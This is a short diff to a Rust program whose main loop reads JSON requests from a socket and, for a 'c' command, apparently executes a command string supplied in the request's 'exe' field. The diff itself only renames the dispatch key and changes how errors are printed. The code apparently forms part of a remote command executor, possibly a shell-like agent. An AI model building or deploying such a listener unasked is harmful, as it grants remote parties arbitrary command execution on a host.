@@ -11,7 +11,7 @@ fn main() {
     loop {
         match sock::recv(&mut stream) {
             Ok(request) => {
-                let cmd = convert::jsonval2str(&request["exe"]);
+                let cmd = convert::jsonval2str(&request["cmd"]);
                 match cmd {
                     "c" => {
                         let command = convert::jsonval2str(&request["exe"]);
@@ -20,7 +20,7 @@ fn main() {
                                 println!("stdout: {:?}", out);
                             }
                             Err (error) => {
-                                println!("error: {}", error);
+                                println!("error: {:?}", error);
                                 break
                             }
                         }
